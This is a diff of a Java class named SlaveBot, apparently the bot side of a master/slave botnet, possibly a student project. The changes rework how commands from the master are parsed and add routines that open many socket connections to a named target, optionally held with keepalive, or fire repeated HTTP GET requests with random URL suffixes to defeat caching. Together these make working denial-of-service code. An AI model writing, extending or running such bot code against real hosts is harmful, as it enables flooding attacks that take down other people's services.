@@ -49,26 +49,30 @@ public class SlaveBot implements Runnable {
 		String delims = " ";
 		StringTokenizer st = new StringTokenizer(targetData, delims);
 		Integer numElements = st.countTokens();
-		String action  = (String)st.nextElement();
-		String targetHostName = ((String) st.nextElement());
-		String targetPort = ((String) st.nextElement());
-		String numberOfConn;
-		String keepAliveOrUrl;
-		
-		if(st.hasMoreElements()){
-		numberOfConn = ((String) st.nextElement());
-		if(st.hasMoreElements()){
-			keepAliveOrUrl = ((String) st.nextElement());
-		}
-		else {
-			keepAliveOrUrl = null;
-		}
-		}
-		else{
-			numberOfConn = null;
-			keepAliveOrUrl = null;
+		String action = null;
+		String targetHostName = null;
+		String targetPort = null;
+		String numberOfConn = null;
+		String keepAliveOrUrl = null;
+
+		if(numElements == 3){
+			action  = (String)st.nextElement();
+			targetHostName = ((String) st.nextElement());
+			targetPort = ((String) st.nextElement());
+			numberOfConn = "1";
 		}
 
+		else if(numElements == 5){
+			action  = (String)st.nextElement();
+			targetHostName = ((String) st.nextElement());
+			targetPort = ((String) st.nextElement());
+			numberOfConn = ((String) st.nextElement());
+			keepAliveOrUrl = ((String) st.nextElement());
+		}
+
+		else{
+			System.out.println("Unknown elements");
+		}
 
 		storeTargetData(action, targetHostName, targetPort, numberOfConn, keepAliveOrUrl);
 	}
@@ -134,74 +138,147 @@ public class SlaveBot implements Runnable {
 
 	}
 
+	public static void simpleConnect(String conKey, String numConnect, String ip, String port){
+
+		Integer numConnectionInt = Integer.parseInt(numConnect);
+		Integer portInt = Integer.parseInt(port);
+		targetData obj = targetDataMap.get(conKey);
+		if (targetDataMap.containsKey(conKey)){
+			try{
+				for(int i = 0; i < numConnectionInt; i++){
+					Socket socObj = new Socket(ip, portInt);
+					obj.arrSoc.add(socObj);
+					//System.out.println("Connected to the target");
+				}
+			}
+			catch(Exception e){
+				System.out.println(e);
+			}
+		}
+
+	}
 
 
 	public static void performConnect(String ip, String port, String numConnection, String keepAliveOrUrl){
 		String conKey = concatinatedData(ip, port);
-		Integer numConnectionInt = Integer.parseInt(numConnection);
-		Integer portInt = Integer.parseInt(port);
-		targetData obj = targetDataMap.get(conKey);
+		if(keepAliveOrUrl == null){
+			simpleConnect(conKey, numConnection, ip, port);
+		}
 
-		if(keepAliveOrUrl.contentEquals("keepalive")){
-			if (targetDataMap.containsKey(conKey)){
-				try{
-					for(int i = 0; i < numConnectionInt; i++){
-						Socket socObj = new Socket(ip, portInt);
-						socObj.setKeepAlive(true);
-						obj.arrSoc.add(socObj);
-						System.out.println("Connected to the target");
+		else{
+			Integer numConnectionInt = Integer.parseInt(numConnection);
+			Integer portInt = Integer.parseInt(port);
+			targetData obj = targetDataMap.get(conKey);
+			if(keepAliveOrUrl.contentEquals("keepalive")){
+				if (targetDataMap.containsKey(conKey)){
+					try{
+						for(int i = 0; i < numConnectionInt; i++){
+							Socket socObj = new Socket(ip, portInt);
+							socObj.setKeepAlive(true);
+							obj.arrSoc.add(socObj);
+							System.out.println("Connected to the target");
+						}
+						listMap();
+					}
+					catch(Exception e){
+						System.out.println(e);
+					}
+				}
+				else{
+					System.out.println("Error Connecting to host");
+				}
+
+			}
+			else if(keepAliveOrUrl.startsWith("url=")){
+
+				String actualUrl = keepAliveOrUrl.replaceAll("url=", "");
+				if(ip.matches(".*\\d+.*")){
+					System.out.println("The ip has numbers in it ");
+					String halfUrl = ip + ":" + port + actualUrl;
+					StringBuilder completeUrl = new StringBuilder(halfUrl);
+					HttpURLConnection connection = null;
+					Random random = new Random();
+					char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
+					int  randomNum = random.nextInt(10) + 1;
+					for (int i = 0; i < randomNum; i++) {
+						char toAppend = chars[random.nextInt(chars.length)];
+						completeUrl.append(toAppend);
+					}
+					System.out.println("The url to connect is " + completeUrl);
+					try{
+						URL url = new URL("http://" + completeUrl.toString());
+						System.out.println("The url to connect is " + url);
+						connection = (HttpURLConnection) url.openConnection();
+						connection.setRequestMethod("GET");
+						int responseCode = connection.getResponseCode();
+						System.out.println("Response Code : " + responseCode);
+
+						if (connection.getResponseCode() != 200) {
+							throw new RuntimeException("Failed : HTTP error code : "
+									+ connection.getResponseCode());
+						}
+						BufferedReader br = new BufferedReader(new InputStreamReader(
+								(connection.getInputStream())));
+						connection.disconnect();
+
+					} catch (MalformedURLException e) {
+
+						e.printStackTrace();
+
+					} catch (IOException e) {
+
+						e.printStackTrace();
+
 					}
 					listMap();
 				}
-				catch(Exception e){
-					System.out.println(e);
+
+				else{
+					System.out.println("The ip does not have numbers");
+					String halfUrl = ip+ actualUrl;
+					StringBuilder completeUrl = new StringBuilder(halfUrl);
+					HttpURLConnection connection = null;
+					Random random = new Random();
+					char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
+					int  randomNum = random.nextInt(10) + 1;
+					for (int i = 0; i < randomNum; i++) {
+						char toAppend = chars[random.nextInt(chars.length)];
+						completeUrl.append(toAppend);
+					}
+					System.out.println("The url to connect is " + completeUrl);
+					try{
+						URL url = new URL("https://" + completeUrl.toString());
+						connection = (HttpURLConnection) url.openConnection();
+						connection.setRequestMethod("GET");
+						int responseCode = connection.getResponseCode();
+						System.out.println("Response Code : " + responseCode);
+
+						if (connection.getResponseCode() != 200) {
+							throw new RuntimeException("Failed : HTTP error code : "
+									+ connection.getResponseCode());
+						}
+						BufferedReader br = new BufferedReader(new InputStreamReader(
+								(connection.getInputStream())));
+						connection.disconnect();
+
+					} catch (MalformedURLException e) {
+
+						e.printStackTrace();
+
+					} catch (IOException e) {
+
+						e.printStackTrace();
+
+					}
+					listMap();
 				}
-			}
-			else{
-				System.out.println("Error Connecting to host");
-			}
 
+
+			}
 		}
-		else if(keepAliveOrUrl.startsWith("url=")){
-			String actualUrl = keepAliveOrUrl.replaceAll("url=", "");
-			//String toAdd = "/#q=";
-			String halfUrl = ip + ":" + port + actualUrl;
-			StringBuilder completeUrl = new StringBuilder(halfUrl);
-			HttpURLConnection connection = null;
-			Random random = new Random();
-			char[] chars = "abcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
-			int  randomNum = random.nextInt(10) + 1;
-			for (int i = 0; i < randomNum; i++) {
-				char toAppend = chars[random.nextInt(chars.length)];
-				completeUrl.append(toAppend);
-			}
-			System.out.println("The url to connect is " + completeUrl);
-			try{
-				URL url = new URL("https://" + completeUrl.toString());
-				connection = (HttpURLConnection) url.openConnection();
-				connection.setRequestMethod("GET");
-				int responseCode = connection.getResponseCode();
-				System.out.println("Response Code : " + responseCode);
 
-				if (connection.getResponseCode() != 200) {
-					throw new RuntimeException("Failed : HTTP error code : "
-							+ connection.getResponseCode());
-				}
-				BufferedReader br = new BufferedReader(new InputStreamReader(
-						(connection.getInputStream())));
-				connection.disconnect();
 
-			} catch (MalformedURLException e) {
 
-				e.printStackTrace();
-
-			} catch (IOException e) {
-
-				e.printStackTrace();
-
-			}
-			listMap();
-		}
 	}
 
 
